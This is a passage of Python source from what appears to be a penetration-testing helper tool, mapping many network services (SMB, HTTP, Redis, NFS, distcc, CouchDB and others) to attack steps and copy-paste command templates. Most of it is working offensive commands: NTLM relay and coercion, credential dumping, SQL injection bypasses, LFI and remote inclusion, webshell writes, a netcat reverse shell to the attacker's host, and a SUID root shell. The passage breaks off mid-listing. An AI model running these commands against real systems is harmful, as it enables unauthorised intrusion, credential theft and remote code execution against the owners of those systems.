    "clamav": [
        "Confirm clamd (3310)",
        "Command execution via clamav-exec / known CVE (SCAN a crafted path)",
        "Use the RCE to stage a reverse shell as the clamav user",
        "Manual steps & further research",
    ],
    "svn": [
        "Enumerate over svn:// (svn ls / svn log / svn info)",
        "Checkout the repo; read commit history & diffs for secrets and creds",
        "svn cat / svn up -r<n> old revisions of removed sensitive files",
        "Manual steps & further research",
    ],
    "mysql": [
        ("Banner: handshake → version + auth plugin → searchsploit", "mysql-banner"),
        ("Root no-pass + default / reused creds; CVE-2012-2122 bypass on old 5.x", "mysql-creds"),
        ("Loot: DBs/users, mysql.user hashes, app creds, LOAD_FILE", "mysql-loot"),
        ("RCE: INTO OUTFILE webshell (FILE priv, exec-verified); UDF guidance", "mysql-rce"),
        ("Manual steps & further research", "mysql-next"),
    ],
    "mssql": [
        ("Banner: SQL Browser (1434) / TDS pre-login → version + instance", "mssql-banner"),
        ("sa blank/default + reused creds (netexec mssql); flags sysadmin", "mssql-creds"),
        ("xp_cmdshell command execution (sysadmin) → foothold", "mssql-exec"),
        ("Loot: DBs, linked servers, sql_login hashes, OPENROWSET file-read", "mssql-loot"),
        ("Manual steps & further research", "mssql-next"),
    ],
    "psql": [
        ("Banner: SSL probe + startup handshake → version + auth method → searchsploit", "psql-banner"),
        ("postgres blank/default + reused creds (psql CLI); flags superuser", "psql-creds"),
        ("Loot: DBs/roles, pg_shadow hashes, app creds, pg_read_file (read-only)", "psql-loot"),
        ("RCE: COPY … FROM PROGRAM command exec (superuser, 9.3+, exec-verified)", "psql-rce"),
        ("Manual steps & further research", "psql-next"),
    ],
    "oracle": [
        ("TNS listener probe → version + status/SID leak → searchsploit (stdlib + nmap)", "oracle-tns"),
        ("Enumerate the SID / service name (TNS leak + nmap oracle-sid-brute)", "oracle-sid"),
        ("Default + reused account brute against the SID (nmap oracle-brute, no lockout)", "oracle-creds"),
        ("Manual steps & further research", "oracle-next"),
    ],
    "mqtt": [
        "Connect anonymously and subscribe to all topics (# wildcard) — sniff for data/creds",
        "Enumerate topics & retained messages; look for device control / secrets",
        "Publish to control topics to influence devices; note impact",
        "If auth is on, try default / known creds against the broker",
        "Manual steps & further research",
    ],
    "ldap": [
        # ── enumerate ──
        ("Bind (anon / reused cred) → domain, users, AS-REP flags, password policy", "ldap-enum"),
        # ── roast targets ──
        ("AS-REP roast (no creds) + Kerberoast (any cred) → crackable hashes", "ldap-roast"),
        # ── loot secrets from LDAP ──
        ("Loot: LAPS + gMSA + description secrets + BloodHound collect", "ldap-loot"),
        # ── ACL abuse / shadow creds / RBCD / ADCS / coerce+relay / DCSync ──
        ("Manual steps & further research", "ldap-next"),
    ],
    "kerberos": [
        # ── enumerate without creds ──
        ("Enumerate valid AD users over AS-REQ (nmap krb5-enum-users + GetNPUsers)", "krb-enum"),
        # ── roast ──
        ("AS-REP roast (no creds) + Kerberoast (reused cred) → crackable hashes", "krb-roast"),
        # ── get access ──
        ("Kerberos pre-auth password spray → validated domain creds (lockout-aware)", "krb-spray"),
        # ── delegation / tickets / noPac / MS14-068 ──
        ("Manual steps & further research", "krb-next"),
    ],
    "msrpc": [
        "Map endpoints via the endpoint mapper (rpcdump) → services & their dynamic ports",
        "SAMR / LSARPC over rpcclient (null or creds): enumdomusers, RID cycle, group members, lsaquery",
        "Coerce auth: MS-RPRN PrinterBug, MS-EFSR PetitPotam, MS-DFSNM DFSCoerce, Coercer → relay / crack",
        "ZeroLogon (MS-NRPC CVE-2020-1472) → reset the DC machine account → DCSync",
        "Remote exec with creds via Task Scheduler (atexec) or Service Control Manager (scmexec / smbexec)",
        "DRSUAPI → DCSync with replication rights; abuse other interfaces (EVEN6, WKSSVC) as found",
        "Manual steps & further research",
    ],
    "snmp": [
        "Brute community strings with a wordlist (onesixtyone: public, private, community)",
        "snmpwalk the full tree — hostname, users, processes, routes, ARP, listening ports, software",
        "Extended MIBs: running processes with arguments (creds!), installed software, local users",
        "Grab configs/creds: Cisco running-config (1.3.6.1.4.1.9.9.96), SNMPv3 USM users",
        "Writable (RW) community → tamper config, or NET-SNMP EXTEND / EXEC MIB → command execution",
        "SNMPv3 → enumerate & brute usernames / auth (snmpv3-brute)",
        "Manual steps & further research",
    ],
    "ipmi": [
        "Dump BMC password hashes — RAKP auth flaw CVE-2013-4786 (ipmi_dumphashes)",
        "Crack the hashes offline (hashcat mode 7300)",
        "Cipher-0 auth bypass → add/modify a BMC admin, then get to the host console",
        "Default vendor creds (ADMIN/ADMIN, root/calvin on iDRAC)",
        "Manual steps & further research",
    ],
    "dns": [
        "Zone transfer (AXFR) against each nameserver → full record dump",
        "Version query (version.bind CHAOS TXT)",
        "Reverse-lookup the subnet & brute-force subdomains → new hosts/vhosts",
        "Note internal names for /etc/hosts and vhost routing; check dynamic-update/cache-poison",
        "Manual steps & further research",
    ],
    "smtp": [
        "Banner & exact version → searchsploit (Exim CVE-2019-10149, Postfix Shellshock)",
        "Username enumeration via VRFY / EXPN / RCPT TO (smtp-user-enum) → valid AD/local users",
        "Open-relay test → spoof/phish internal users from a trusted-looking sender",
        "Authenticate with reused creds; read internal mail for creds & info",
        "Command injection / template / known MTA RCE → shell as the mail service",
        "Client-side: deliver a malicious attachment / link if a user reads mail",
        "Manual steps & further research",
    ],
    "mail2": [
        "Banner & version (POP3/IMAP) → searchsploit",
        "Authenticate with reused / known creds",
        "Read mailboxes for credentials, tokens and internal information",
        "Manual steps & further research",
    ],
    "telnet": [
        ("Banner + version → searchsploit; probe for a no-auth shell / backdoor prompt", "telnet-banner"),
        ("Default / known / reused creds; targeted, lockout-aware", "telnet-creds"),
        ("Sniff cleartext creds off the wire (passive; MITM stays manual)", "telnet-sniff"),
        ("Manual steps & further research", "telnet-next"),
    ],
    "irc": [
        "Connect; enumerate channels, users and the server software/version",
        "UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) → RCE",
        "searchsploit the ircd; try oper default creds",
        "Manual steps & further research",
    ],
    "rdp": [
        ("Security layer + NLA (stdlib X.224) + NTLM machine/domain/OS (netexec); MS12-020", "rdp-enum"),
        ("Reused / known creds & pass-the-hash (netexec rdp, lockout-aware)", "rdp-creds"),
        ("Manual steps & further research", "rdp-next"),
    ],
    "vnc": [
        ("RFB handshake (stdlib) → security types; 'None' = open desktop, else spray target", "vnc-enum"),
        ("Weak/default + reused VNC password (netexec vnc, targeted)", "vnc-creds"),
        ("Manual steps & further research", "vnc-next"),
    ],
    "ssh": [
        ("Banner + KEXINIT algos → searchsploit; libssh / Terrapin / user-enum flags", "ssh-banner"),
        ("Reused / known creds & recovered keys; targeted spray (fail2ban-aware)", "ssh-creds"),
        ("Manual steps & further research", "ssh-next"),
    ],
    "squid": [
        "Use it as a proxy to reach internal hosts & ports (proxychains)",
        "Port-scan / access internal-only services through the proxy",
        "cachemgr info-leak (cache_object://) → internal targets & config",
        "Try creds if the proxy requires auth (reused)",
        "Manual steps & further research",
    ],
    "cups": [
        "Admin web UI on 631/admin; note version",
        "Recent CUPS RCE chain (CVE-2024-47176 …) via a crafted printer/IPP",
        "Enumerate printers & captured jobs; read config for creds",
        "Manual steps & further research",
    ],
    "jetdirect": [
        "PJL / PostScript access (PRET) — filesystem, NVRAM, display",
        "Read/write the printer filesystem; retrieve stored jobs & configs",
        "Extract stored credentials (LDAP/SMB pass-back), captured print jobs",
        "Manual steps & further research",
    ],
    "rservices": [
        "rlogin / rsh / rexec via a trusted host or missing auth",
        "~/.rhosts or /etc/hosts.equiv abuse → log in as root without a password",
        "Manual steps & further research",
    ],
    "x11": [
        "Confirm access is unauthenticated (xdpyinfo / x11-access)",
        "Screenshot the session (xwd); read window contents",
        "Keylog and inject keystrokes to run commands as the logged-in user",
        "Manual steps & further research",
    ],
    "finger": [
        "Enumerate users (finger @IP; finger root@IP) — real names, last login, home",
        "Build a validated user list to feed brute-force / spray on other services",
        "Manual steps & further research",
    ],
    "ident": [
        "Query the owner of each open port (ident-user-enum)",
        "Map services to local user accounts — pick brute-force targets",
        "Manual steps & further research",
    ],
    "rtsp": [
        "Enumerate stream URLs (rtsp-url-brute / Cameradar)",
        "Default / weak camera creds; view the stream",
        "searchsploit the camera/DVR firmware for RCE",
        "Manual steps & further research",
    ],
    "sip": [
        "Enumerate extensions & the PBX (svmap / svwar)",
        "Crack / spray extension passwords (svcrack); register a rogue endpoint",
        "Sniff SIP creds; test toll fraud / call interception",
        "Manual steps & further research",
    ],
    "nntp": [
        "Banner & version → searchsploit",
        "List newsgroups and read articles for info",
        "Try auth / posting; check for an auth bypass",
        "Manual steps & further research",
    ],
    "other": [
        "Grab the banner (nc / telnet / openssl s_client) and identify the service",
        "searchsploit the product & version; check exploit-db / GitHub",
        "Look the port & protocol up in HackTricks for a methodology",
        "Try default / anonymous credentials",
        "Run the protocol's nmap scripts (--script '<name>-*') for quick wins",
        "Interact manually to understand the protocol; note it for deeper research",
        "Manual steps & further research",
    ],
}


# ── phase-5 command playbook (new model) ──────────────────────────────────────
# Each service maps {step_index → [command, …]}: copy-paste Kali / HTB tooling where the
# variable parts are <PLACEHOLDERS> the operator fills in. `r <n><letter>` opens a new
# terminal with the chosen command pre-typed on the prompt (editable, NOT executed) — the
# operator replaces the placeholders and presses Enter. Everything is a placeholder, even
# <RHOST>/<RPORT>, so the same line is valid in the read-only catalog and the live host
# checklist. A service present here renders in command-mode; one absent falls back to the
# legacy wired-tool checklist (which is being retired step by step).
_PH = {  # documented placeholder vocabulary — kept here so every service stays consistent
    "RHOST": "target IP / hostname", "RPORT": "target port", "LHOST": "your IP",
    "LPORT": "your listener port", "IFACE": "your interface (tun0/eth0)",
    "DOMAIN": "AD domain (FQDN)", "DC": "domain-controller IP", "USER": "username",
    "PASS": "password", "NTHASH": "NT hash", "SHARE": "share name", "COMMAND": "command",
    "USERLIST": "users wordlist", "PASSLIST": "passwords wordlist", "WORDLIST": "wordlist",
    "LOCALFILE": "local file to upload", "CPASSWORD": "GPP cpassword blob",
    "PRODUCT": "product name", "VERSION": "version string", "PATH": "URL path",
    "PARAM": "parameter name", "URL": "full URL", "DB": "database name",
    "TABLE": "table name", "COMMUNITY": "SNMP community string", "KEYFILE": "SSH private key",
    "JWT": "JSON Web Token", "EXT": "file extensions", "SIZE": "response size to filter",
    "TOKEN": "API token", "SID": "Oracle SID", "NODE": "cluster node", "COOKIE": "session cookie",
    "MODULE": "module / repo name", "EMAIL": "email address", "EXTENSION": "SIP extension",
}
_STEP_COMMANDS = {
    "smb": {
        1: [  # Null / guest enumeration
            "enum4linux-ng -A <RHOST>",
            "nxc smb <RHOST> -u '' -p '' --shares",
            "smbclient -L //<RHOST>/ -N",
            "smbmap -H <RHOST> -u '' -p ''",
            "rpcclient -U '' -N <RHOST> -c 'enumdomusers;enumdomgroups;querydominfo'",
        ],
        2: [  # Version-RCE scan (detection only)
            "nmap -p445 --script 'smb-vuln-*' -oN smb-vuln.txt <RHOST>",
            "nxc smb <RHOST> -u '' -p '' -M ms17-010",
            "nxc smb <RHOST>",
        ],
        3: [  # Loot readable shares for secrets
            "smbclient //<RHOST>/<SHARE> -N -c 'recurse ON; prompt OFF; mget *'",
            "smbclient //<RHOST>/<SHARE> -U '<USER>%<PASS>' -c 'recurse ON; prompt OFF; mget *'",
            "nxc smb <RHOST> -u '<USER>' -p '<PASS>' --spider <SHARE> --regex .",
            "smbmap -H <RHOST> -u '<USER>' -p '<PASS>' -R <SHARE>",
            "manspider <RHOST> -u '<USER>' -p '<PASS>' -c 'password' 'secret'",
        ],
        4: [  # SYSVOL / NETLOGON GPP loot
            "nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M gpp_password",
            "nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M gpp_autologin",
            "smbclient //<RHOST>/SYSVOL -U '<USER>%<PASS>' -c 'recurse ON; prompt OFF; mget *'",
            "gpp-decrypt '<CPASSWORD>'",
        ],
        5: [  # Poison LLMNR / NBT-NS → capture NetNTLM
            "sudo responder -I <IFACE> -wv",
            "sudo responder -I <IFACE> -A",
            "hashcat -m 5600 hashes.txt <WORDLIST>",
        ],
        6: [  # NTLM relay (signing not required)
            "nxc smb <RHOST>/24 --gen-relay-list relay-targets.txt",
            "impacket-ntlmrelayx -tf relay-targets.txt -smb2support -i",
            "impacket-ntlmrelayx -t smb://<RHOST> -smb2support -c '<COMMAND>'",
        ],
        7: [  # Coerce auth → relay to escalate
            "python3 PetitPotam.py -u '<USER>' -p '<PASS>' <LHOST> <RHOST>",
            "coercer coerce -u '<USER>' -p '<PASS>' -t <RHOST> -l <LHOST>",
            "printerbug.py '<DOMAIN>/<USER>:<PASS>@<RHOST>' <LHOST>",
        ],
        8: [  # DC CVEs: ZeroLogon, noPac, PrintNightmare (detection only)
            "nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M zerologon",
            "nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M nopac",
            "nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M printnightmare",
        ],
        9: [  # Spray creds & hashes (mind lockout)
            "nxc smb <RHOST> -u <USERLIST> -p '<PASS>' --continue-on-success",
            "nxc smb <RHOST> -u '<USER>' -H <NTHASH>",
            "kerbrute passwordspray -d <DOMAIN> --dc <DC> <USERLIST> '<PASS>'",
        ],
        10: [  # Valid creds / hash → shell
            "impacket-psexec '<DOMAIN>/<USER>:<PASS>@<RHOST>'",
            "impacket-wmiexec '<DOMAIN>/<USER>:<PASS>@<RHOST>'",
            "impacket-psexec '<DOMAIN>/<USER>@<RHOST>' -hashes ':<NTHASH>'",
            "nxc smb <RHOST> -u '<USER>' -p '<PASS>' -x '<COMMAND>'",
        ],
        11: [  # Dump SAM / LSA / LSASS; DCSync
            "nxc smb <RHOST> -u '<USER>' -p '<PASS>' --sam --lsa",
            "impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<RHOST>'",
            "impacket-secretsdump '<DOMAIN>/<USER>@<RHOST>' -just-dc",
        ],
        12: [  # Writable share → hash capture / payload
            "nxc smb <RHOST> -u '<USER>' -p '<PASS>' --shares",
            "smbclient //<RHOST>/<SHARE> -U '<USER>%<PASS>' -c 'put <LOCALFILE>'",
            "nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M slinky -o SERVER=<LHOST> NAME=@theft",
        ],
        13: [  # Manual steps & further research
            "# HackTricks SMB: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb",
            "searchsploit samba",
        ],
    },
    "http": {
        1: [
            "curl -sILk http://<RHOST>:<RPORT>/",
            "curl -sk -X OPTIONS http://<RHOST>:<RPORT>/ -i",
            "curl -sILk https://<RHOST>/",
        ],
        2: [
            "whatweb -a3 http://<RHOST>:<RPORT>/",
            "nmap -sV -p<RPORT> --script http-headers,http-title,http-generator <RHOST>",
            "nuclei -u http://<RHOST>:<RPORT>/ -t http/technologies/",
        ],
        3: [
            "openssl s_client -connect <RHOST>:443 -servername <RHOST> </dev/null 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'",
            "nmap -p443 --script ssl-cert <RHOST>",
        ],
        4: [
            "searchsploit <PRODUCT> <VERSION>",
            "nuclei -u http://<RHOST>:<RPORT>/ -t http/cves/",
        ],
        5: [
            "curl -sk http://<RHOST>:<RPORT>/ | grep -Ei 'password|api[_-]?key|secret|token|BEGIN'",
            "curl -sk http://<RHOST>:<RPORT>/main.js | grep -Eo 'https?://[^\" ]+'",
        ],
        6: [
            "curl -sk http://<RHOST>:<RPORT>/robots.txt",
            "curl -sk http://<RHOST>:<RPORT>/sitemap.xml",
            "curl -sk http://<RHOST>:<RPORT>/.well-known/security.txt",
        ],
        7: [
            "curl -skI http://<RHOST>:<RPORT>/ | grep -i set-cookie",
            "jwt_tool <JWT>",
            "hashcat -m 16500 jwt.txt <WORDLIST>",
        ],
        8: [
            "ffuf -u http://<RHOST>:<RPORT>/ -H 'Host: FUZZ.<DOMAIN>' -w <WORDLIST> -ac",
            "gobuster vhost -u http://<RHOST>:<RPORT> -w <WORDLIST> --append-domain",
        ],
        9: [
            "feroxbuster -u http://<RHOST>:<RPORT>/ -w <WORDLIST> -x php,html,txt",
            "gobuster dir -u http://<RHOST>:<RPORT>/ -w <WORDLIST> -x php,txt,html",
            "ffuf -u http://<RHOST>:<RPORT>/FUZZ -w <WORDLIST> -e .php,.txt,.html",
        ],
        10: [
            "git-dumper http://<RHOST>:<RPORT>/.git/ ./loot-git",
            "curl -sk http://<RHOST>:<RPORT>/.git/HEAD",
            "nuclei -u http://<RHOST>:<RPORT>/ -t http/exposures/",
        ],
        11: [
            "arjun -u http://<RHOST>:<RPORT>/<PATH>",
            "ffuf -u 'http://<RHOST>:<RPORT>/<PATH>?FUZZ=1' -w <WORDLIST> -fs <SIZE>",
        ],
        12: [
            "wpscan --url http://<RHOST>:<RPORT>/ --enumerate ap,at,u --api-token <TOKEN>",
            "droopescan scan drupal -u http://<RHOST>:<RPORT>/",
            "joomscan --url http://<RHOST>:<RPORT>/",
        ],
        13: [
            "hydra -L <USERLIST> -P <PASSLIST> <RHOST> http-post-form '<PATH>:username=^USER^&password=^PASS^:F=incorrect'",
            "hydra -L <USERLIST> -P <PASSLIST> -f <RHOST> -s <RPORT> http-get /<PATH>",
        ],
        14: [
            "ffuf -u http://<RHOST>:<RPORT>/<PATH> -X POST -d 'username=admin&password=FUZZ' -w <WORDLIST> -fc 401",
            "# SQLi auth bypass: username=admin'-- -   /   ' or 1=1-- -",
        ],
        15: [
            "hydra -l <USER> -P <PASSLIST> <RHOST> http-post-form '<PATH>:username=^USER^&password=^PASS^:F=<PATH>'",
        ],
        16: [
            "ffuf -u 'http://<RHOST>:<RPORT>/api/user/FUZZ' -w <WORDLIST>",
            "# swap object IDs / cookies / JWT claims to test broken access control",
        ],
        17: [
            "sqlmap -u 'http://<RHOST>:<RPORT>/<PATH>?<PARAM>=1' --batch --dump",
            "sqlmap -r req.txt --batch --dump",
        ],
        18: [
            "sqlmap -u 'http://<RHOST>:<RPORT>/<PATH>?<PARAM>=1' --batch --dbs --level 5 --risk 3",
            "sqlmap -r req.txt --batch --os-shell",
        ],
        19: [
            "ffuf -u 'http://<RHOST>:<RPORT>/<PATH>?<PARAM>=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs <SIZE>",
            "curl -sk 'http://<RHOST>:<RPORT>/<PATH>?<PARAM>=../../../../etc/passwd'",
            "curl -sk 'http://<RHOST>:<RPORT>/<PATH>?<PARAM>=php://filter/convert.base64-encode/resource=index.php'",
        ],
        20: [
            "curl -sk 'http://<RHOST>:<RPORT>/<PATH>?<PARAM>=http://<LHOST>/shell.txt'",
            "# host the payload:  python3 -m http.server 80",
        ],
        21: [
            "curl -sk 'http://<RHOST>:<RPORT>/<PATH>?<PARAM>=;id'",
            "commix -u 'http://<RHOST>:<RPORT>/<PATH>?<PARAM>=1' --batch",
        ],
        22: [
            "curl -sk 'http://<RHOST>:<RPORT>/<PATH>?<PARAM>={{7*7}}'",
            "tplmap -u 'http://<RHOST>:<RPORT>/<PATH>?<PARAM>=1'",
        ],
        23: [
            "curl -sk http://<RHOST>:<RPORT>/<PATH> -H 'Content-Type: application/xml' -d @xxe.xml",
            "curl -sk 'http://<RHOST>:<RPORT>/<PATH>?<PARAM>=http://169.254.169.254/latest/meta-data/'",
        ],
        24: [
            "curl -sk -F 'file=@shell.php' http://<RHOST>:<RPORT>/<PATH>",
            "# then browse to the uploaded webshell and pass ?cmd=id",
        ],
        25: [
            "# admin panel → upload a plugin/theme or edit a template → RCE",
            "msfconsole -q -x 'search <PRODUCT>'",
        ],
        26: [
            "# HackTricks web: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web",
            "nuclei -u http://<RHOST>:<RPORT>/",
        ],
    },
    "winrm": {
        1: [
            "nxc winrm <RHOST>",
            "nmap -p5985,5986 --script http-title <RHOST>",
            "curl -sk http://<RHOST>:5985/wsman -X POST -i",
        ],
        2: [
            "nxc winrm <RHOST> -u <USERLIST> -p <PASSLIST> --continue-on-success",
            "nxc winrm <RHOST> -u <USER> -H <NTHASH>",
        ],
        3: [
            "nxc winrm <RHOST> -u <USER> -p <PASS>",
            "# a green (Pwn3d!) = member of Remote Management Users / admin",
        ],
        4: [
            "evil-winrm -i <RHOST> -u <USER> -p <PASS>",
            "evil-winrm -i <RHOST> -u <USER> -H <NTHASH>",
            "nxc winrm <RHOST> -u <USER> -p <PASS> -x 'whoami /all'",
        ],
        5: [
            "# HackTricks WinRM: https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm",
        ],
    },
    "ftp": {
        1: [
            "nc -nv <RHOST> <RPORT>",
            "nmap -sV -p<RPORT> --script ftp-* <RHOST>",
            "searchsploit <PRODUCT> <VERSION>",
        ],
        2: [
            "ftp <RHOST> <RPORT>",
            "wget -m --no-passive ftp://anonymous:anonymous@<RHOST>:<RPORT>/",
        ],
        3: [
            "curl -s ftp://<USER>:<PASS>@<RHOST>:<RPORT>/ --list-only",
            "curl -T <LOCALFILE> ftp://<USER>:<PASS>@<RHOST>:<RPORT>/",
        ],
        4: [
            "hydra -L <USERLIST> -P <PASSLIST> ftp://<RHOST>:<RPORT> -f",
            "nxc ftp <RHOST> -u <USERLIST> -p <PASSLIST>",
        ],
        5: [
            "curl -T shell.php ftp://<USER>:<PASS>@<RHOST>:<RPORT>/",
            "# if the FTP root == web root, browse to the uploaded webshell",
        ],
        6: [
            "nmap -Pn -b anonymous:anonymous@<RHOST> <TARGET-INTERNAL-IP>",
        ],
        7: [
            "# HackTricks FTP: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp",
            "searchsploit <PRODUCT>",
        ],
    },
    "tftp": {
        1: [
            "nmap -sU -p69 --script tftp-enum <RHOST>",
            "tftp <RHOST>",
        ],
        2: [
            "tftp <RHOST> -c get <PATH>",
            "for f in /etc/passwd running-config startup-config; do tftp <RHOST> -c get $f; done",
        ],
        3: [
            "tftp <RHOST> -c put <LOCALFILE>",
        ],
        4: [
            "# HackTricks TFTP: https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp",
        ],
    },
    "nfs": {
        1: [
            "showmount -e <RHOST>",
            "nmap -sV -p111,2049 --script 'nfs-*' <RHOST>",
        ],
        2: [
            "mkdir -p /mnt/nfs && sudo mount -t nfs -o vers=3 <RHOST>:<SHARE> /mnt/nfs -o nolock",
            "echo test > /mnt/nfs/pshunter_wtest 2>&1; ls -la /mnt/nfs/",
        ],
        3: [
            "sudo cp /bin/bash /mnt/nfs/rootbash && sudo chown root:root /mnt/nfs/rootbash && sudo chmod 4755 /mnt/nfs/rootbash",
            "# on the target after foothold:  /path/rootbash -p",
        ],
        4: [
            "sudo useradd -u <UID> pwn && su pwn -c 'cat /mnt/nfs/home/<USER>/.ssh/id_rsa'",
        ],
        5: [
            "sudo mount -t nfs4 <RHOST>:/ /mnt/nfs && ls -la /mnt/nfs/",
        ],
        6: [
            "# HackTricks NFS: https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting",
        ],
    },
    "afp": {
        1: [
            "nmap -sV -p548 --script 'afp-*' <RHOST>",
        ],
        2: [
            "# mount as guest / with creds (macOS):  open afp://<USER>:<PASS>@<RHOST>/",
            "hydra -L <USERLIST> -P <PASSLIST> afp://<RHOST>",
        ],
        3: [
            "# hunt Time Machine backups, .keychain, config files for creds",
        ],
        4: [
            "# HackTricks AFP: https://book.hacktricks.xyz/network-services-pentesting/548-pentesting-apple-filing-protocol-afp",
        ],
    },
    "rsync": {
        1: [
            "rsync -av --list-only rsync://<RHOST>:873/",
        ],
        2: [
            "rsync -av rsync://<RHOST>:873/<MODULE>/ ./loot-rsync/",
            "echo test > t && rsync -av t rsync://<RHOST>:873/<MODULE>/",
        ],
        3: [
            "rsync -av rsync://<RHOST>:873/<MODULE>/etc/shadow ./",
        ],
        4: [
            "rsync -av rsync://<USER>@<RHOST>:873/<MODULE>/ ./  # prompts for password",
        ],
        5: [
            "# HackTricks rsync: https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync",
        ],
    },
    "distcc": {
        1: [
            "nmap -p3632 --script distcc-cve2004-2687 <RHOST>",
        ],
        2: [
            "nmap -p3632 --script distcc-cve2004-2687 --script-args 'distcc-cve2004-2687.cmd=id' <RHOST>",
            "msfconsole -q -x 'use exploit/unix/misc/distcc_exec; set RHOSTS <RHOST>; run'",
        ],
        3: [
            "nmap -p3632 --script distcc-cve2004-2687 --script-args \"distcc-cve2004-2687.cmd=nc <LHOST> <LPORT> -e /bin/sh\" <RHOST>",
        ],
        4: [
            "# HackTricks distcc: https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc",
        ],
    },
    "redis": {
        1: [
            "redis-cli -h <RHOST> -p <RPORT> INFO",
            "redis-cli -h <RHOST> -p <RPORT> CONFIG GET '*'",
            "nmap -p<RPORT> --script redis-info <RHOST>",
        ],
        2: [
            "redis-cli -h <RHOST> -p <RPORT> -a <PASS> PING",
            "hydra -P <PASSLIST> redis://<RHOST>:<RPORT>",
        ],
        3: [
            "redis-cli -h <RHOST> -p <RPORT> KEYS '*'",
            "redis-cli -h <RHOST> -p <RPORT> CONFIG GET requirepass",
        ],
        4: [
            "redis-cli -h <RHOST> -p <RPORT> CONFIG SET dir /var/www/html/ && redis-cli -h <RHOST> -p <RPORT> CONFIG SET dbfilename shell.php && redis-cli -h <RHOST> -p <RPORT> SET x '<?php system($_GET[0]);?>' && redis-cli -h <RHOST> -p <RPORT> SAVE",
            "# SSH-key write: set dir ~/.ssh, dbfilename authorized_keys, SET your pubkey, SAVE",
        ],
        5: [
            "# HackTricks Redis: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis",
        ],
    },
    "memcached": {
        1: [
            "nc -nv <RHOST> 11211   # then: stats / stats items / stats slabs",
            "nmap -sV -p11211 --script memcached-info <RHOST>",
        ],
        2: [
            "memcdump --servers=<RHOST>:11211",
            "for k in $(memcdump --servers=<RHOST>:11211); do echo \"get $k\" | nc -q1 <RHOST> 11211; done",
        ],
        3: [
            "# HackTricks memcached: https://book.hacktricks.xyz/network-services-pentesting/11211-memcache",
        ],
    },
    "elastic": {
        1: [
            "curl -sk http://<RHOST>:9200/",
            "curl -sk http://<RHOST>:9200/_cat/indices?v",
        ],
        2: [
            "curl -sk 'http://<RHOST>:9200/<DB>/_search?pretty&size=100'",
            "curl -sk 'http://<RHOST>:9200/_all/_search?pretty' | grep -Ei 'pass|user|token'",
        ],
        3: [
            "searchsploit elasticsearch",
            "msfconsole -q -x 'use exploit/multi/elasticsearch/search_groovy_script; set RHOSTS <RHOST>; run'",
        ],
        4: [
            "curl -sk -u <USER>:<PASS> http://<RHOST>:9200/",
            "curl -sk http://<RHOST>:5601/api/status   # Kibana",
        ],
        5: [
            "# HackTricks Elastic: https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch",
        ],
    },
    "mongodb": {
        1: [
            "mongosh 'mongodb://<RHOST>:<RPORT>' --eval 'db.version()'",
            "nmap -sV -p<RPORT> --script 'mongodb-*' <RHOST>",
        ],
        2: [
            "nmap -p<RPORT> --script mongodb-brute <RHOST>",
            "mongosh 'mongodb://<USER>:<PASS>@<RHOST>:<RPORT>' --eval 'db.adminCommand({listDatabases:1})'",
        ],
        3: [
            "mongosh 'mongodb://<RHOST>:<RPORT>' --eval 'db.adminCommand({listDatabases:1})'",
            "mongosh 'mongodb://<RHOST>:<RPORT>/<DB>' --eval 'db.getCollectionNames().forEach(c=>printjson(db[c].find().limit(5).toArray()))'",
        ],
        4: [
            "# HackTricks MongoDB: https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb",
        ],
    },
    "couchdb": {
        1: [
            "curl -sk http://<RHOST>:5984/_all_dbs",
            "curl -sk http://<RHOST>:5984/",
        ],
        2: [
            "curl -sk -X PUT 'http://<RHOST>:5984/_users/org.couchdb.user:pwn' -d '{\"type\":\"user\",\"name\":\"pwn\",\"roles\":[\"_admin\"],\"password\":\"pwn\"}' -H 'Content-Type: application/json'  # CVE-2017-12635",
        ],
        3: [
            "# CVE-2017-12636: set query_server to a shell command, then trigger a view → RCE",
            "searchsploit couchdb",
        ],
        4: [
            "# Erlang cookie reuse (with epmd 4369) → node RCE",
        ],
        5: [
            "# HackTricks CouchDB: https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb",
        ],
    },
    "neo4j": {
        1: [
            "curl -sk http://<RHOST>:7474/",
            "cypher-shell -a bolt://<RHOST>:7687 -u neo4j -p neo4j",
        ],
        2: [
            "cypher-shell -a bolt://<RHOST>:7687 -u <USER> -p <PASS> 'MATCH (n) RETURN n LIMIT 25;'",
        ],
        3: [
            "searchsploit neo4j",
            "# APOC RCE: CALL apoc.load.jsonParams / dbms.security functions on vulnerable builds",
        ],
        4: [
            "# HackTricks Neo4j: https://book.hacktricks.xyz/network-services-pentesting/7687-pentesting-neo4j",
        ],
    },
    "influxdb": {
        1: [
            "python3 influxdb_exploit.py <RHOST> 8086   # CVE-2019-20933 auth bypass",
        ],
        2: [
            "curl -sk 'http://<RHOST>:8086/query?q=SHOW+DATABASES'",
            "curl -sk 'http://<RHOST>:8086/query?db=<DB>&q=SELECT+*+FROM+/.*/+LIMIT+50'",
        ],
        3: [
            "curl -sk -u <USER>:<PASS> 'http://<RHOST>:8086/query?q=SHOW+DATABASES'",
        ],
        4: [
            "# HackTricks InfluxDB: https://book.hacktricks.xyz/network-services-pentesting/8086-pentesting-influxdb",
        ],
    },
    "amqp": {
        1: [
            "nmap -sV -p5672 --script amqp-info <RHOST>",
            "# try guest:guest, then reused creds",
        ],
        2: [
            "curl -sk -u <USER>:<PASS> http://<RHOST>:15672/api/overview",
        ],
        3: [
